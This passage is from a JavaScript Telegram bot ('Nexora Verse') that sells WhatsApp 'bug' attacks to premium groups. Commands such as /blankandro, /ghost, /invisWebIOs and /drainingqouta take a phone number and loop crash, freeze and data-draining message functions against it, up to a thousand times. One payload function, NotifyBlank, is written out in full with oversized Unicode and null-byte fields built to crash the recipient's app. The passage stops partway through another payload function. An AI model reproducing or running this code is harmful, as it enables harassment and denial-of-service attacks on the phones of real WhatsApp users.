      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const pendingVerification = new Set();
// ================
// 🔐 VERIFIKASI TOKEN
// ================
bot.use(async (ctx, next) => {
  if (secureMode) return next();
  if (tokenValidated) return next();

  const chatId = (ctx.chat && ctx.chat.id) || (ctx.from && ctx.from.id);
  if (!chatId) return next();
  if (pendingVerification.has(chatId)) return next();
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ];

  let loadingMsg = null;

  try {
    loadingMsg = await ctx.reply("⏳ *BOT SEDANG MEMVERIFIKASI TOKEN...*", {
      parse_mode: "Markdown"
    });

    for (const frame of frames) {
      if (tokenValidated) break;
      await sleep(180);
      try {
        await ctx.telegram.editMessageText(
          loadingMsg.chat.id,
          loadingMsg.message_id,
          null,
          `🔐 *Verifikasi Token Server...*\n${frame}`,
          { parse_mode: "Markdown" }
        );
      } catch { /* skip */ }
    }

    if (!databaseUrl || !tokenBot) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Konfigurasi server tidak lengkap.*\nPeriksa `databaseUrl` atau `tokenBot`.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Fungsi ambil data token pakai HTTPS native
    const getTokenData = () => new Promise((resolve, reject) => {
      https.get(databaseUrl, { timeout: 6000 }, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const json = JSON.parse(data);
            resolve(json);
          } catch {
            reject(new Error("Invalid JSON response"));
          }
        });
      }).on("error", (err) => reject(err));
    });

    let result;
    try {
      result = await getTokenData();
    } catch (err) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Gagal mengambil daftar token dari server.*\nSilakan coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    const tokens = (result && Array.isArray(result.tokens)) ? result.tokens : [];
    if (tokens.length === 0) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Token tidak tersedia di database.*\nHubungi admin untuk memperbarui data.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Validasi token
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ *Token diverifikasi server!*\nMembuka menu utama...",
        { parse_mode: "Markdown" }
      );
      await sleep(1000);
      pendingVerification.delete(chatId);
      return next();
    } else {
      const keyboardBypass = {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/sunnnlyy" }]
        ]
      };

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "*Bypass Detected!*\nToken tidak sah atau tidak terdaftar.\nYour access has been restricted.",
        { parse_mode: "Markdown" }
      );

      await sleep(500);
      await ctx.replyWithPhoto("https://files.catbox.moe/9g24hy.jpg", {
        caption:
          "🚫 *Access Denied*\nSistem mendeteksi token tidak valid.\nGunakan versi original dari owner.",
        parse_mode: "Markdown",
        reply_markup: keyboardBypass
      });

      pendingVerification.delete(chatId);
      return;
    }

  } catch (err) {
    console.error("Verification Error:", err);
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Terjadi kesalahan saat memverifikasi token.*",
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.reply("⚠️ *Terjadi kesalahan saat memverifikasi token.*", {
        parse_mode: "Markdown"
      });
    }
  } finally {
    pendingVerification.delete(chatId);
  }
});

// =========================
// COMMAND START
// =========================
bot.start(async (ctx) => {
  if (!tokenValidated)
    return ctx.reply("❌ *Token belum diverifikasi server.* Tunggu proses selesai.", { parse_mode: "Markdown" });
  
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  // ============================
  // 🔓 OWNER BYPASS FULL
  // ============================
  if (!isOwner) {
    // Jika user buka di private → blokir
    if (ctx.chat.type === "private") {
      // Kirim notifikasi ke owner
      bot.telegram.sendMessage(
        ownerID,
        `📩 *NOTIFIKASI START PRIVATE*\n\n` +
        `👤 User: ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 ID: <code>${ctx.from.id}</code>\n` +
        `🔗 Username: @${ctx.from.username || "-"}\n` +
        `💬 Akses private diblokir.\n\n` +
        `⌚ Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }
  
 
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}

  const menuMessage = `
<blockquote><pre>⬡═—⊱ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⊰—═⬡</pre></blockquote>
⛧ 𝗢𝘄𝗻𝗲𝗿 : @sunnnlyy<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
⛧ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0 completed
⛧ 𝗣𝗿𝗲𝗳𝗶𝘅 : /
⛧ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 : JavaScript
⛧ 𝗧𝘆𝗽𝗲 𝗦𝗰𝗿𝗶𝗽𝘁 : Bebas Spam Bug
<blockquote><pre>⬡═—⊱ STATUS BOT ⊰—═⬡</pre></blockquote>
⛧ 𝗕𝗼𝘁 𝗦𝘁𝗮𝘁𝘂𝘀 : ${premiumStatus}  
⛧ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲  : @${ctx.from.username || "Tidak Ada"}
⛧ 𝗨𝘀𝗲𝗿 𝗜𝗱   : <code>${userId}</code>
⛧ 𝗦𝗲𝗻𝗱𝗲𝗿 : ${senderStatus}  
⛧ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtimeStatus}
<blockquote><pre>⧫━⟢『 THANKS 』⟣━⧫</pre></blockquote>`;

  const keyboard = [
        [
            { text: "XBUGS", callback_data: "/bug", style: "Primary", icon_custom_emoji_id: "5190892569092976735" }, 
            { text: "XSETTINGS", callback_data: "/controls", style: "Danger", icon_custom_emoji_id: "5395471503603037530" }
        ],
        [
            { text: "DEVELOPER", url: "https://t.me/sunnnlyy", style: "Success", icon_custom_emoji_id: "6098241278372221298" }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<blockquote><pre>⬡═—⊱ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⊰—═⬡</pre></blockquote>
⛧ 𝗢𝘄𝗻𝗲𝗿 : @sunnnlyy<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
⛧ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0 complete
⛧ 𝗣𝗿𝗲𝗳𝗶𝘅 : /
⛧ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 : JavaScript
⛧ 𝗧𝘆𝗽𝗲 𝗦𝗰𝗿𝗶𝗽𝘁 : Bebas Spam Bug
<blockquote><pre>⬡═—⊱ STATUS BOT ⊰—═⬡</pre></blockquote>
⛧ 𝗕𝗼𝘁 𝗦𝘁𝗮𝘁𝘂𝘀 : ${premiumStatus}  
⛧ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲  : @${ctx.from.username || "Tidak Ada"}
⛧ 𝗨𝘀𝗲𝗿 𝗜𝗱   : <code>${userId}</code>
⛧ 𝗦𝗲𝗻𝗱𝗲𝗿 : ${senderStatus}  
⛧ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtimeStatus}
<blockquote><pre>⧫━⟢『 THANKS 』⟣━⧫</pre></blockquote>`;

  const keyboard = [
        [
            { text: "XBUGS", callback_data: "/bug", style: "Primary", icon_custom_emoji_id: "5190892569092976735" }, 
            { text: "XSETTINGS", callback_data: "/controls", style: "Danger", icon_custom_emoji_id: "5395471503603037530" }
        ],
        [
            { text: "DEVELOPER", url: "https://t.me/sunnnlyy", style: "Success", icon_custom_emoji_id: "6098241278372221298" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═—⊱ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⊰—═⬡</pre></blockquote>
⛧ 𝗢𝘄𝗻𝗲𝗿 : @sunnnlyy<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
⛧ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0 complete
⛧ 𝗣𝗿𝗲𝗳𝗶𝘅 : /
⛧ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 : JavaScript
⛧ 𝗧𝘆𝗽𝗲 𝗦𝗰𝗿𝗶𝗽𝘁 : Bebas Spam Bug
<blockquote><pre>⬡═—⊱ CONTROL MENU ⊰—═⬡</pre></blockquote>
⌬ /blockcmd - Blokir Command
⌬ /unblockcmd - Buka Blokir Command
⌬ /addbot - Add Sender 
⌬ /setcd - Set Cooldown
⌬ /killsesi - Reset Session
⌬ /addprem - Add Premium 
⌬ /delprem - Delete Premium 
⌬ /addpremgrup - Add Premium Group
⌬ /delpremgrup - Delete Premium Group
⌬ /tiktok - Tiktok Downloader
⌬ /tourl - To Url Image/Video
⌬ /tourl2 - To Url Image

<blockquote><pre>⬡═―—⊱ Click Button Menu ⊰―—═⬡</pre></blockquote>`;

    const keyboard = [
        [
            { text: "BACK", callback_data: "/start", style: "Primary", icon_custom_emoji_id: "5787546290527145353" },
            { text: "CHANNEL RESMI", url: "https://t.me/AboutKingZurrx", style: "Success", icon_custom_emoji_id: "6097933166008341599" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═—⊱ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⊰—═⬡</pre></blockquote>
⛧ 𝗢𝘄𝗻𝗲𝗿 : @sunnnlyy<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
⛧ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0 complete
⛧ 𝗣𝗿𝗲𝗳𝗶𝘅 : /
⛧ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 : JavaScript
⛧ 𝗧𝘆𝗽𝗲 𝗦𝗰𝗿𝗶𝗽𝘁 : Bebas Spam Bug
<blockquote><pre>𝑫𝒆𝒍𝒂𝒚 𝑺𝒑𝒂𝒎</pre></blockquote>
⌬ /majicdelay - delay for murbug (bebas spam)
<blockquote><pre>𝑨𝒏𝒅𝒓𝒐𝒊𝒅 𝑩𝒖𝒈𝒔</pre></blockquote>
⌬ /blankandro - not all work device
<blockquote><pre>𝑰𝒑𝒉𝒐𝒏𝒆 𝑩𝒖𝒈𝒔</pre></blockquote>
⌬ /invisWebIOs - beta testing
<blockquote><pre>𝑫𝒓𝒂𝒊𝒏𝒊𝒏𝒈 𝑸𝒐𝒖𝒕𝒂</pre></blockquote>
⌬ /drainingqouta - ekstra buldozer
<blockquote><pre>𝑫𝒆𝒍𝒂𝒚 𝑯𝒂𝒓𝒅</pre></blockquote>
⌬ /delaymention - delay duration
<blockquote><pre>𝑭𝒐𝒓𝒄𝒍𝒐𝒔𝒆 𝑺𝒑𝒂𝒎</pre></blockquote>
⌬ /ghost - not all work device

<blockquote><pre>⬡═―—⊱ Click Button Menu ⊰―—═⬡</pre></blockquote>`;

    const keyboard = [
        [
            { text: "BACK", callback_data: "/start", style: "Primary", icon_custom_emoji_id: "5787546290527145353" },
            { text: "CHANNEL RESMI", url: "https://t.me/AboutKingZurrx", style: "Success", icon_custom_emoji_id: "6097933166008341599" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.command("blankandro", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /blankandro 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Notification Blank
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1000; i++) {
    await gladiatorBlankV1(sock, target);
    await sleep(400);
    await gladiatorBlankV2(sock, target);
    await sleep(400);
    await paramsBug(sock, target);
    await sleep(500);
    await NotifyBlank(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Stuck
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delaymention", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delaymention 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Mention Delay Hard
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await VnXdelayJmbd(sock, target);
    await VnXDelayAiInvis(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Mention Delay Hard
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("majicdelay", checkWhatsAppConnection, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /majicdelay 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ majicdelay (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 5; i++) {
    await DelayFreezeByMia(sock, target);
    await sleep(400);
    await magicDelayV2(sock, target);
    await sleep(400);
    await DelayOneMsgPermaVnX(sock, target);
    await sleep(400);
    await VnXHard(sock, target);
    await sleep(500);
    await VnXAudioBulldoNew(sock, target);
    await sleep(500);
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 majicdelay dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("ghost", checkWhatsAppConnection, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /ghost 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ ghost (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 1000; i++) {
    await SchemaFCv2(sock, target);
    await invisFCMsg(sock, target);
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 ghost dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("drainingqouta", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drainingqouta 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Draining Quota Hard
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 7; i++) {
    await Bulldozer10GB(sock, target);
    await bulldozerDelay2GB;
    await eXtraBulldozer(sock, target);
    await sleep(10000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Draining Quota Hard
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("invisWebIOs", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /invisWebIOs 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Iphone Crash
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await invisWebIOs(sock, target);
    await sleep(400);
    await VnXCrashIos(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐞𝐱𝐨𝐫𝐚 𝐕𝐞𝐫𝐬𝐞 ⎭ ⊰―—═⬡l
⌑ Target: ${q}
⌑ Type: Invisible Iphone Crash
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

// FUNCTION BUG DISINI
async function NotifyBlank(sock, target) {
    const latitude = (Math.random() * 180 - 90).toFixed(6);
    const longitude = (Math.random() * 360 - 180).toFixed(6);
    
    const msg = {
        message: {
            locationMessage: {
                degreesLatitude: parseFloat(latitude),
                degreesLongitude: parseFloat(longitude),
                urlTrackingMap: {
                    urlTrackingMapElements: [
                        {
                            originalUrl: "https://" + "ꦽ".repeat(50000),
                            unconsentedUsersUrl: "https://" + "ꦽ".repeat(50000),
                            consentedUsersUrl: "https://" + "ꦽ".repeat(50000),
                            cardIndex: 1,
                        },
                        {
                            originalUrl: "https://" + "ꦽ".repeat(50000),
                            unconsentedUsersUrl: "https://" + "ꦽ".repeat(50000),
                            consentedUsersUrl: "https://" + "ꦽ".repeat(50000),
                            cardIndex: 2,
                        },
                    ],
                },
                contextInfo: {
                    forwardingScore: 6,
                    isForwarded: true,
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: {
                                text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: `{"values":{"in_pin_code":"999999","building_name":" #zephyrine ","landmark_area":" #zephyrine ","address":" #zephyrine ","tower_number":" #zephyrine ","city":" #zephyrine ","name":"# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩","phone_number":"0","house_number":" #zephyrine ","floor_number":" #zephyrine ","state":"X${"\u0000".repeat(900000)}"}}`,
                                version: 3
                            }
                        }
                    }
                },
                buttonsMessage: {
                    text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                    contentText: "ꦽ".repeat(50000)
                }
            }
        }
    };
    
    await sock.relayMessage(target, msg, {
        messageId: null,
        participant: { jid: target }
    });
}

async function VCardUI(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "pending", 
                order_type: "ORDER"
              },
              share_payment_status: true,
